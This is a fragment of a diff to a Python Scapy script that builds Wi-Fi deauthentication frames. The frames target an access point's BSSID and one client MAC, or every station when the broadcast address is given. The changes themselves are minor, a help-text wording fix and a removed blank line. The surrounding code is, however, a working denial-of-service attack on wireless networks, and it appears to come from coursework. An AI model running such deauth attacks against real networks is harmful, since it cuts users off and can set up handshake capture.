@@ -16,7 +16,7 @@ parser.add_argument("-b", "--BSSID", required=True, help="The BSSID of the Wirel
 parser.add_argument("-c", "--Client", required=True,
                     help="The MAC address of the Client you want to kick off the Access Point, use FF:FF:FF:FF:FF:FF if you want a broadcasted deauth to all stations on the targeted Access Point")
 
-parser.add_argument("-r", "--Reason", required=True, help="The reason value of the deauth (1/4/5/8)")
+parser.add_argument("-r", "--Reason", required=True, help="The reason code of the deauth (1/4/5/8)")
 
 args = parser.parse_args()
 
@@ -27,7 +27,6 @@ packet = RadioTap()
 # Depending of the reason, the addresses in the dot11 layer are not the same, we could have de-duplicated the code further, at the cost of readability.
 # We chose against that trade-off.
 # We also decided to force the unspecified reason to be sent from the AP to the client, we could have prompted the user, but we decided against it
-
 if args.Reason in "145":
     packet = packet / Dot11(type=0, subtype=12, addr1=args.Client, addr2=args.BSSID, addr3=args.BSSID) / Dot11Deauth(
         reason=int(args.Reason))
